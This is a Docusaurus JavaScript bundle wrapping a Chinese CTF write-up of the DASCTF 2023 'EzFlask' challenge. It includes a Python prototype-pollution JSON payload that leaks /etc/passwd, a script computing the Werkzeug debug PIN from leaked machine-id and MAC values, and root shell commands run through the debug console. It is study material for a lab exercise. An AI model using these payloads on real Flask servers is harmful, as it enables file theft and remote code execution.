"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[4062],{42922:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>c,contentTitle:()=>i,default:()=>p,frontMatter:()=>s,metadata:()=>a,toc:()=>d});var t=r(85893),o=r(11151);const s={},i="DASCTF 2023 & 0X401 \u4e03\u6708\u6691\u671f\u6311\u6218\u8d5b EzFlask",a={id:"Xuanji/CTF/10",title:"DASCTF 2023 & 0X401 \u4e03\u6708\u6691\u671f\u6311\u6218\u8d5b EzFlask",description:"\u9996\u5148\u8bbf\u95ee\u670d\u52a1\uff0c\u83b7\u5f97\u6e90\u7801",source:"@site/docs/Xuanji/CTF/10.md",sourceDirName:"Xuanji/CTF",slug:"/Xuanji/CTF/10",permalink:"/Target-Machines-WriteUp/docs/Xuanji/CTF/10",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Xuanji/CTF/10.md",tags:[],version:"current",frontMatter:{},sidebar:"Xuanji_Sidebar",previous:{title:"\u7384\u673a",permalink:"/Target-Machines-WriteUp/docs/Xuanji/"},next:{title:"2024 \u94c1\u4eba\u4e09\u9879 \u51b3\u8d5b Misc - Zip_guessinteger",permalink:"/Target-Machines-WriteUp/docs/Xuanji/CTF/77"}},c={},d=[{value:"Reference",id:"reference",level:2}];function l(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,o.a)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h1,{id:"dasctf-2023--0x401-\u4e03\u6708\u6691\u671f\u6311\u6218\u8d5b-ezflask",children:"DASCTF 2023 & 0X401 \u4e03\u6708\u6691\u671f\u6311\u6218\u8d5b EzFlask"}),"\n",(0,t.jsx)(e.p,{children:"\u9996\u5148\u8bbf\u95ee\u670d\u52a1\uff0c\u83b7\u5f97\u6e90\u7801"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:'import uuid\n\nfrom flask import Flask, request, session\nfrom secret import black_list\nimport json\n\napp = Flask(__name__)\napp.secret_key = str(uuid.uuid4())\n\ndef check(data):\n    for i in black_list:\n        if i in data:\n            return False\n    return True\n\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, \'__getitem__\'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\nclass user():\n    def __init__(self):\n        self.username = ""\n        self.password = ""\n        pass\n    def check(self, data):\n        if self.username == data[\'username\'] and self.password == data[\'password\']:\n            return True\n        return False\n\nUsers = []\n\n@app.route(\'/register\',methods=[\'POST\'])\ndef register():\n    if request.data:\n        try:\n            if not check(request.data):\n                return "Register Failed"\n            data = json.loads(request.data)\n            if "username" not in data or "password" not in data:\n                return "Register Failed"\n            User = user()\n            merge(data, User)\n            Users.append(User)\n        except Exception:\n            return "Register Failed"\n        return "Register Success"\n    else:\n        return "Register Failed"\n\n@app.route(\'/login\',methods=[\'POST\'])\ndef login():\n    if request.data:\n        try:\n            data = json.loads(request.data)\n            if "username" not in data or "password" not in data:\n                return "Login Failed"\n            for user in Users:\n                if user.check(data):\n                    session["username"] = data["username"]\n                    return "Login Success"\n        except Exception:\n            return "Login Failed"\n    return "Login Failed"\n\n@app.route(\'/\',methods=[\'GET\'])\ndef index():\n    return open(__file__, "r").read()\n\nif __name__ == "__main__":\n    app.run(host="0.0.0.0", port=8080)\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u5229\u7528 Python \u539f\u578b\u94fe\u6c61\u67d3\uff0c\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:'POST /register HTTP/1.1\nHost: env.xj.edisec.net:32285\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Type: application/json\nContent-Length: 199\n\n{\n    "username": "test",\n    "password": "test",\n    "check": {\n        "__func__": {\n            "__globals__": {\n                "__file__": "/etc/passwd"\n            }\n        }\n    }\n}\n\nHTTP/1.1 200 OK\nServer: Werkzeug/2.3.6 Python/3.10.1\nDate: Wed, 01 May 2024 02:31:16 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 16\nConnection: close\n\nRegister Success\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u7136\u540e\u8bbf\u95ee"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:"GET / HTTP/1.1\nHost: env.xj.edisec.net:32285\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\nHTTP/1.1 200 OK\nServer: Werkzeug/2.3.6 Python/3.10.1\nDate: Wed, 01 May 2024 02:31:18 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 922\nConnection: close\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u4e8e\u662f\u53ef\u4ee5\u8bfb\u53d6\u5230\u4ee5\u4e0b\u6587\u4ef6"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:'title="/etc/machine-id"',children:"96cec10d3d9307792745ec3b85c89620\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:'title="/sys/class/net/eth0/address"',children:"4a:a8:ff:c2:9f:7f\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u7f16\u5199\u811a\u672c\u8ba1\u7b97 Debug Console PIN Code"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:'import hashlib\nfrom itertools import chain\n\nprobably_public_bits = [\n    "root",  # username\n    "flask.app",  # modname\n    "Flask",  # appname\n    "/usr/local/lib/python3.10/site-packages/flask/app.py",  # moddir\n]\n\nprivate_bits = [\n    str(int("4a:a8:ff:c2:9f:7f".replace(":", ""), 16)),  # uuidnode\n    "96cec10d3d9307792745ec3b85c89620",  # machine_id\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode("utf-8")\n    h.update(bit)\nh.update(b"cookiesalt")\n\ncookie_name = f"__wzd{h.hexdigest()[:20]}"\n\n# If we need to generate a pin we salt it a bit more so that we don\'t\n# end up with the same value and generate out 9 digits\nnum = None\nif num is None:\n    h.update(b"pinsalt")\n    num = f"{int(h.hexdigest(), 16):09d}"[:9]\n\n# Format the pincode in groups of digits for easier remembering if\n# we don\'t have a result yet.\nrv = None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = "-".join(num[x : x + group_size].rjust(group_size, "0") for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n# 171-928-035\n'})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:r(29014).Z+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(e.p,{children:"\u4e8e\u662f\u5c31\u53ef\u4ee5\u76f4\u63a5 getshell"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:'[console ready]\n>>> import os\n>>> print(os.popen("whoami").read().strip())\nroot\n>>> print(os.popen("ls -lah /").read().strip())\ntotal 28K\ndrwxr-xr-x.   1 root root  71 May  1 02:26 .\ndrwxr-xr-x.   1 root root  71 May  1 02:26 ..\n-rwxr-xr-x.   1 root root   0 May  1 02:26 .dockerenv\ndrwxr-xr-x.   1 root root  56 May  1 02:26 app\ndrwxr-xr-x.   1 root root   6 Dec 21  2021 bin\ndrwxr-xr-x.   2 root root   6 Dec 11  2021 boot\ndrwxr-xr-x.   5 root root 360 May  1 02:26 dev\n-rw-r--r--.   1 root root 779 Jul 25  2023 docker-entrypoint.sh\ndrwxr-xr-x.   1 root root  66 May  1 02:26 etc\n-rw-r--r--.   1 root root  25 May  1 02:26 find_ez_flag\n-rwxr--r--.   1 root root  24 May  1 02:26 flag\ndrwxr-xr-x.   2 root root   6 Dec 11  2021 home\ndrwxr-xr-x.   1 root root  30 Dec 21  2021 lib\ndrwxr-xr-x.   2 root root  34 Dec 20  2021 lib64\ndrwxr-xr-x.   2 root root   6 Dec 20  2021 media\ndrwxr-xr-x.   2 root root   6 Dec 20  2021 mnt\ndrwxr-xr-x.   2 root root   6 Dec 20  2021 opt\ndr-xr-xr-x. 214 root root   0 May  1 02:26 proc\ndrwx------.   1 root root  20 Jul 25  2023 root\ndrwxr-xr-x.   1 root root  21 May  1 02:26 run\ndrwxr-xr-x.   2 root root 16K Dec 20  2021 sbin\ndrwxr-xr-x.   2 root root   6 Dec 20  2021 srv\ndr-xr-xr-x.  13 root root   0 Dec 28 10:23 sys\ndrwxrwxrwt.   1 root root   6 Jul 25  2023 tmp\ndrwxr-xr-x.   1 root root  19 Dec 20  2021 usr\ndrwxr-xr-x.   1 root root  17 Dec 20  2021 var\n>>> print(os.popen("cat /find_ez_flag").read().strip())\nFLAG{XJ_Nz1vVoeRXAFuPhcA}\n'})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:"FLAG{XJ_Nz1vVoeRXAFuPhcA}\n"})}),"\n",(0,t.jsx)(e.h2,{id:"reference",children:"Reference"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"https://jbnrz.com.cn/index.php/2023/07/28/dasctf-0x401/",children:"DASCTF & 0X401 \u2013 My Blog"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"https://www.cnblogs.com/EddieMurphy-blogs/p/17859822.html",children:"DASCTF 2023 & 0X401 \u4e03\u6708\u6691\u671f\u6311\u6218\u8d5b - web \u590d\u73b0 - Eddie_Murphy - \u535a\u5ba2\u56ed"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"https://boogipop.com/2023/07/22/DASCTF%202023%20&%200X401%20Web%20WriteUp/",children:"DASCTF 2023 & 0X401 Web WriteUp - Boogiepop Doesn't Laugh"})})]})}function p(n={}){const{wrapper:e}={...(0,o.a)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(l,{...n})}):l(n)}},29014:(n,e,r)=>{r.d(e,{Z:()=>t});const t=r.p+"assets/images/image_20240535-103554-c43e40394f4aea5cc219c754a154ff77.png"},11151:(n,e,r)=>{r.d(e,{Z:()=>a,a:()=>i});var t=r(67294);const o={},s=t.createContext(o);function i(n){const e=t.useContext(s);return t.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function a(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(o):n.components||o:i(n.components),t.createElement(s.Provider,{value:e},n.children)}}}]);